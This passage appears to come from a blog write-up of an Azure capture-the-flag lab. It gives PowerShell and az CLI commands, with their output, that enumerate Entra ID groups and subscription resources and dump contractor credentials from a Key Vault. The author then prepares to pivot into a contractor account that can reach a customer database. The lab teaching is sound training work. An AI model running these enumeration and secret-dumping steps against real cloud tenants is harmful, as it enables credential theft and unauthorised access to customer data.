+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantId&#34;</span><span class="err">:</span> <span class="s2">&#34;2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;user&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;marcus@megabigtech.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span><span class="err">:</span> <span class="s2">&#34;user&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The next command allows us to get a Microsoft Graph session as current user.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Install-Module</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">Graph</span> <span class="c"># Install module</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">Graph</span><span class="p">.</span><span class="py">Users</span> <span class="c"># Import module</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Connect-MgGraph</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Install-Module</span> <span class="n">Az</span> <span class="c"># Install module</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">Az</span> <span class="c"># Import module</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span> 
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/hHdKO9M.png"></p>
+<blockquote>
+<p>Note:</p>
+<ol>
+<li>
+<p>The <code>Connect-AzAccount</code> command logs you into your Azure account, allowing you to manage and interact with your Azure resources via PowerShell.</p>
+</li>
+<li>
+<p>The <code>Connect-MgGraph</code> command logs you into Microsoft Graph, enabling you to interact with and manage Microsoft 365 services and data (like users, groups, and mail) via PowerShell.</p>
+</li>
+</ol>
+</blockquote>
+<p>We can then use the below command to show information about our current logged in user just as the <code>whoami</code> command in linux</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">ad</span> <span class="nb">signed-in</span><span class="n">-user</span> <span class="n">show</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;@odata.context&#34;</span><span class="err">:</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/</span><span class="nv">$metadata</span><span class="s2">#users/</span><span class="nv">$entity</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;businessPhones&#34;</span><span class="err">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;displayName&#34;</span><span class="err">:</span> <span class="s2">&#34;Marcus Hutch&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;givenName&#34;</span><span class="err">:</span> <span class="s2">&#34;Marcus&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;41c178d3-c246-4c00-98f0-8113bd631676&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;jobTitle&#34;</span><span class="err">:</span> <span class="s2">&#34;Flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;mail&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;mobilePhone&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;officeLocation&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;preferredLanguage&#34;</span><span class="err">:</span> <span class="n">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;surname&#34;</span><span class="err">:</span> <span class="s2">&#34;Hutch&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;userPrincipalName&#34;</span><span class="err">:</span> <span class="s2">&#34;marcus@megabigtech.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>it is possible to get the group membership of the user by running the following command.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-MgUserMemberOf</span> <span class="n">-userid</span> <span class="s2">&#34;marcus@megabigtech.com&#34;</span> <span class="p">|</span> <span class="nb">select </span><span class="p">*</span> <span class="n">-ExpandProperty</span> <span class="n">additionalProperties</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">AdditionalProperties</span><span class="p">[</span><span class="s2">&#34;displayName&#34;</span><span class="p">]}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="p">.</span><span class="n">AdditionalProperties</span><span class="p">[</span><span class="s2">&#34;displayName&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">--------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">Directory</span> <span class="n">Readers</span>
+</span></span><span class="line"><span class="cl"><span class="k">Default</span> <span class="n">Directory</span>
+</span></span><span class="line"><span class="cl"><span class="n">All</span> <span class="n">Company</span>
+</span></span></code></pre></div><p>As shown in the above output every member of the <code>Directory Readers</code> group is allowed to enumerate Entra ID. Since we have permission, It is also important to enumerate further permissions to see if this user can access other Azure resources :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Given subscription ID</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$CurrentSubscriptionID</span> <span class="p">=</span> <span class="s2">&#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Set output format</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$OutputFormat</span> <span class="p">=</span> <span class="s2">&#34;table&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Set the given subscription as the active one</span>
+</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="n">az</span> <span class="n">account</span> <span class="nb">set </span><span class="p">-</span><span class="n">-subscription</span> <span class="nv">$CurrentSubscriptionID</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># List resources in the current subscription</span>
+</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="n">az</span> <span class="n">resource</span> <span class="n">list</span> <span class="n">-o</span> <span class="nv">$OutputFormat</span>
+</span></span></code></pre></div><p>The below output tells us that the Azure Key Vault named <code>ext-contractors</code> contains a <strong>Key Vault</strong> (<code>Microsoft.KeyVault/vaults</code>). This makes the resource group highly sensitive because Azure Key Vaults are typically used to store:</p>
+<ul>
+<li><strong>Secrets</strong>: Sensitive data such as passwords, API keys, tokens, or database connection strings.</li>
+<li><strong>Encryption Keys</strong>: Used to encrypt/decrypt data, such as files or databases.</li>
+<li><strong>Certificates</strong>: SSL/TLS certificates or other authentication-related certificates.</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/PhqYNbX.png"></p>
+<p>We can then go ahead and check what&rsquo;s inside the key vault with the below script. Make sure to replace the <code>$VaultName</code> and <code>$SubscriptionID</code> on your own personal engagement.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Set variables</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VaultName</span> <span class="p">=</span> <span class="s2">&#34;ext-contractors&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Set the current Azure subscription</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SubscriptionID</span> <span class="p">=</span> <span class="s2">&#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">az</span> <span class="n">account</span> <span class="nb">set </span><span class="p">-</span><span class="n">-subscription</span> <span class="nv">$SubscriptionID</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># List and store the secrets</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$secretsJson</span> <span class="p">=</span> <span class="n">az</span> <span class="n">keyvault</span> <span class="n">secret</span> <span class="n">list</span> <span class="p">-</span><span class="n">-vault-name</span> <span class="nv">$VaultName</span> <span class="n">-o</span> <span class="n">json</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$secrets</span> <span class="p">=</span> <span class="nv">$secretsJson</span> <span class="p">|</span> <span class="nb">ConvertFrom-Json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># List and store the keys</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keysJson</span> <span class="p">=</span> <span class="n">az</span> <span class="n">keyvault</span> <span class="n">key</span> <span class="n">list</span> <span class="p">-</span><span class="n">-vault-name</span> <span class="nv">$VaultName</span> <span class="n">-o</span> <span class="n">json</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keys</span> <span class="p">=</span> <span class="nv">$keysJson</span> <span class="p">|</span> <span class="nb">ConvertFrom-Json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Output the secrets</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;Secrets in vault </span><span class="nv">$VaultName</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$secret</span> <span class="k">in</span> <span class="nv">$secrets</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Write-Host</span> <span class="nv">$secret</span><span class="p">.</span><span class="py">id</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Output the keys</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;Keys in vault </span><span class="nv">$VaultName</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$key</span> <span class="k">in</span> <span class="nv">$keys</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Write-Host</span> <span class="nv">$key</span><span class="p">.</span><span class="py">id</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The below output indicates that the <strong><code>ext-contractors</code></strong> vault contains <strong>secrets</strong>, and in addition to secrets, <strong>keys</strong> and <strong>certificates</strong> may also be stored in the same Key Vault. Azure Key Vault is designed to securely store <strong>secrets</strong>, <strong>encryption keys</strong>, and <strong>certificates</strong>, so it’s common to find all three types of data objects within a single vault.</p>
+<blockquote>
+<p>Also take note that, Contractor and consultant accounts often have high privileges due to their temporary nature, making them prime targets for penetration testers and red teamers.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="p">./</span><span class="n">keyvaultenum</span><span class="p">.</span><span class="py">ps1</span>                                                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Secrets</span> <span class="k">in</span> <span class="n">vault</span> <span class="nb">ext-contractors</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="nb">ext-contractors</span><span class="p">.</span><span class="py">vault</span><span class="p">.</span><span class="py">azure</span><span class="p">.</span><span class="n">net</span><span class="p">/</span><span class="n">secrets</span><span class="p">/</span><span class="nb">alissa-suarez</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="nb">ext-contractors</span><span class="p">.</span><span class="py">vault</span><span class="p">.</span><span class="py">azure</span><span class="p">.</span><span class="n">net</span><span class="p">/</span><span class="n">secrets</span><span class="p">/</span><span class="nb">josh-harvey</span>
+</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="nb">ext-contractors</span><span class="p">.</span><span class="py">vault</span><span class="p">.</span><span class="py">azure</span><span class="p">.</span><span class="n">net</span><span class="p">/</span><span class="n">secrets</span><span class="p">/</span><span class="nb">ryan-garcia</span>
+</span></span><span class="line"><span class="cl"><span class="n">Keys</span> <span class="k">in</span> <span class="n">vault</span> <span class="nb">ext-contractors</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/NceHRQA.png"></p>
+<p>We then need to see what we have in each of this Key Vault entries, Also make sure to replace the <code>$VaultName</code>, <code>$SecretNames</code> and <code>$SubscriptionID</code> in an engagement to get valid output.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Set variables</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VaultName</span> <span class="p">=</span> <span class="s2">&#34;ext-contractors&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SecretNames</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;alissa-suarez&#34;</span><span class="p">,</span> <span class="s2">&#34;josh-harvey&#34;</span><span class="p">,</span> <span class="s2">&#34;ryan-garcia&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Set the current Azure subscription</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$SubscriptionID</span> <span class="p">=</span> <span class="s2">&#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">az</span> <span class="n">account</span> <span class="nb">set </span><span class="p">-</span><span class="n">-subscription</span> <span class="nv">$SubscriptionID</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Retrieve and output the secret values</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;Secret Values from vault </span><span class="nv">$VaultName</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$SecretName</span> <span class="k">in</span> <span class="nv">$SecretNames</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$secretValueJson</span> <span class="p">=</span> <span class="n">az</span> <span class="n">keyvault</span> <span class="n">secret</span> <span class="n">show</span> <span class="p">-</span><span class="n">-name</span> <span class="nv">$SecretName</span> <span class="p">-</span><span class="n">-vault-name</span> <span class="nv">$VaultName</span> <span class="n">-o</span> <span class="n">json</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$secretValue</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$secretValueJson</span> <span class="p">|</span> <span class="nb">ConvertFrom-Json</span><span class="p">).</span><span class="py">value</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Write-Host</span> <span class="s2">&#34;</span><span class="nv">$SecretName</span><span class="s2"> - </span><span class="nv">$secretValue</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>As shown below the credentials for the three users where retrieved ;</p>
+<p><img loading="lazy" src="https://i.imgur.com/xMzOeFv.png"></p>
+<p>It is also possible to enumerate all of this via the &ldquo;<strong>Azure Portal</strong>&rdquo; By clicking &ldquo;All resources&rdquo; on the portal or using the search bar with the specified search term.</p>
+<p><img loading="lazy" src="https://i.imgur.com/mmWwR58.png"></p>
+<p>Click on the <code>ext-contractors</code> resource</p>
+<p><img loading="lazy" src="https://i.imgur.com/WwVtKqZ.png"></p>
+<p>Under <strong>objects</strong> &gt; <strong>Secrets</strong>, you should find all user objects</p>
+<p><img loading="lazy" src="https://i.imgur.com/vxxhK5d.png"></p>
+<p>It’s good practice to verify if the retrieved users are still active, enabled, or even exist in Entra ID or that they have the same password set, as password reuse is a very common bad practice.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">ad</span> <span class="n">user</span> <span class="n">list</span> <span class="p">-</span><span class="n">-query</span> <span class="s2">&#34;[?givenName==&#39;Alissa&#39; || givenName==&#39;Josh&#39; || givenName==&#39;Ryan&#39;].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}&#34;</span> <span class="n">-o</span> <span class="n">table</span>
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>                      <span class="n">UPN</span>                              <span class="n">JobTitle</span>
+</span></span><span class="line"><span class="cl"><span class="p">------------------------</span>  <span class="p">-------------------------------</span>  <span class="p">------------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">Josh</span> <span class="n">Harvey</span> <span class="p">(</span><span class="n">Consultant</span><span class="p">)</span>  <span class="n">ext</span><span class="p">.</span><span class="py">josh</span><span class="p">.</span><span class="n">harvey</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>  <span class="n">Consultant</span> <span class="p">(</span><span class="n">Customer</span> <span class="n">DB</span> <span class="n">Migration</span> <span class="n">Project</span><span class="p">)</span>
+</span></span></code></pre></div><p>The above result shows that the Josh Harvey contractor account is still available. We can go ahead and enumerate this account further.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-MgUser</span> <span class="n">-UserId</span> <span class="n">ext</span><span class="p">.</span><span class="py">josh</span><span class="p">.</span><span class="n">harvey</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span>              <span class="n">Id</span>                                   <span class="n">Mail</span> <span class="n">UserPrincipalName</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------</span>              <span class="p">--</span>                                   <span class="p">----</span> <span class="p">-----------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">Josh</span> <span class="n">Harvey</span> <span class="p">(</span><span class="n">Consultant</span><span class="p">)</span> <span class="n">6470f625</span><span class="p">-</span><span class="n">41ce</span><span class="p">-</span><span class="mf">4233</span><span class="n">-a621-fad0aa0b7300</span>      <span class="n">ext</span><span class="p">.</span><span class="py">josh</span><span class="p">.</span><span class="n">harvey</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span>
+</span></span></code></pre></div><p>With the above <code>Id</code> value we can query for groups that this user belongs to :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-MgUserMemberOf</span> <span class="n">-userid</span> <span class="nv">$userid</span> <span class="p">|</span> <span class="nb">select </span><span class="p">*</span> <span class="n">-ExpandProperty</span> <span class="n">additionalProperties</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">AdditionalProperties</span><span class="p">[</span><span class="s2">&#34;displayName&#34;</span><span class="p">]}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="p">.</span><span class="n">AdditionalProperties</span><span class="p">[</span><span class="s2">&#34;displayName&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">--------------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="nb">CUSTOMER-DATABASE</span><span class="n">-ACCESS</span>
+</span></span><span class="line"><span class="cl"><span class="n">Directory</span> <span class="n">Readers</span>
+</span></span><span class="line"><span class="cl"><span class="k">Default</span> <span class="n">Directory</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/VqRrYbK.png"></p>
+<p>We see that the user <code>Josh</code> belongs to the <code>CUSTOMER-DATABASE-ACCESS</code> group as shown above, we can go ahead and query this group to see what we have :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-MgGroup</span> <span class="n">-Filter</span> <span class="s2">&#34;displayName eq &#39;CUSTOMER-DATABASE-ACCESS&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span>              <span class="n">Id</span>                                   <span class="n">MailNickname</span> <span class="n">Description</span>                                                                                <span class="n">GroupTypes</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------</span>              <span class="p">--</span>                                   <span class="p">------------</span> <span class="p">-----------</span>                                                                                <span class="p">----------</span>
+</span></span><span class="line"><span class="cl"><span class="nb">CUSTOMER-DATABASE</span><span class="n">-ACCESS</span> <span class="n">79b430a5-ea4d</span><span class="p">-</span><span class="n">4de6</span><span class="p">-</span><span class="n">855b</span><span class="p">-</span><span class="n">908bdfb052dc</span> <span class="n">6e69ec6a</span><span class="p">-</span><span class="mf">6</span>   <span class="n">Provides</span> <span class="n">full</span> <span class="nb">read-only</span> <span class="n">access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Mega</span> <span class="n">Big</span> <span class="n">Tech</span> <span class="n">customer</span> <span class="n">list</span> <span class="n">and</span> <span class="n">customer</span> <span class="n">information</span> <span class="p">{}</span>
+</span></span></code></pre></div><p>From the above output, members of this group can access the Mega Big Tech customer list&hellip;, taking our enumeration further, Let&rsquo;s see what permissions are assigned.</p>
+<p><img loading="lazy" src="https://i.imgur.com/j47lk7v.png"></p>
+<p>However I noticed that there are not so many permissions in the above output since we are still logged in as user <code>marcus</code>. So Log out of the current session using <code>az logout</code> and <code>Disconnect-AzAccount</code>, then log back in with <code>az login</code> and <code>Connect-AzAccount</code> to try accessing the <strong>Josh Harvey</strong> account with the Key Vault credentials we got earlier.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AzRoleAssignment</span> <span class="n">-Scope</span> <span class="s2">&#34;/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94&#34;</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">DisplayName</span><span class="p">,</span> <span class="n">RoleDefinitionName</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DisplayName</span>              <span class="n">RoleDefinitionName</span>
+</span></span><span class="line"><span class="cl"><span class="p">-----------</span>              <span class="p">------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ian</span> <span class="n">Austin</span>               <span class="n">Key</span> <span class="n">Vault</span> <span class="n">Administrator</span>
+</span></span><span class="line"><span class="cl"><span class="n">Marcus</span> <span class="n">Hutch</span>             <span class="n">Key</span> <span class="n">Vault</span> <span class="n">Reader</span>
+</span></span><span class="line"><span class="cl"><span class="n">Marcus</span> <span class="n">Hutch</span>             <span class="n">Key</span> <span class="n">Vault</span> <span class="n">Secrets</span> <span class="n">User</span>
+</span></span><span class="line"><span class="cl"><span class="n">Josh</span> <span class="n">Harvey</span> <span class="p">(</span><span class="n">Consultant</span><span class="p">)</span> <span class="n">Reader</span>
+</span></span><span class="line"><span class="cl"><span class="nb">CUSTOMER-DATABASE</span><span class="n">-ACCESS</span> <span class="n">Customer</span> <span class="n">Database</span> <span class="n">Access</span>
+</span></span><span class="line"><span class="cl"><span class="nb">IT-HELPDESK</span>              <span class="n">Reader</span>
+</span></span><span class="line"><span class="cl"><span class="n">Security</span> <span class="n">User</span>            <span class="n">Storage</span> <span class="n">Blob</span> <span class="n">Data</span> <span class="n">Reader</span>
+</span></span><span class="line"><span class="cl"><span class="n">Security</span> <span class="n">User</span>            <span class="n">Reader</span>
+</span></span><span class="line"><span class="cl"><span class="n">Azure</span> <span class="n">Security</span> <span class="n">Insights</span>  <span class="n">Microsoft</span> <span class="n">Sentinel</span> <span class="n">Automation</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">c7bf3d89f766471691ccdf29</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">c7bf3d89f766471691ccdf29</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">c7bf3d89f766471691ccdf29</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">c7bf3d89f766471691ccdf29</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">014b118fb59f4ef59faa8c63</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">014b118fb59f4ef59faa8c63</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">014b118fb59f4ef59faa8c63</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">014b118fb59f4ef59faa8c63</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">f2dde2b466f240afa614abbc</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">f2dde2b466f240afa614abbc</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">b047e83f402747fd8797e1ff</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">b047e83f402747fd8797e1ff</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">0f7ef2ab65244e72925a57e4</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">0f7ef2ab65244e72925a57e4</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">0f7ef2ab65244e72925a57e4</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">0f7ef2ab65244e72925a57e4</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">f41ed7dd9122452585bcc1ff</span> <span class="n">Monitoring</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">f41ed7dd9122452585bcc1ff</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
+</span></span><span class="line"><span class="cl"><span class="n">1ae7323ccead497685d1c18a</span> <span class="n">Log</span> <span class="n">Analytics</span> <span class="n">Contributor</span>
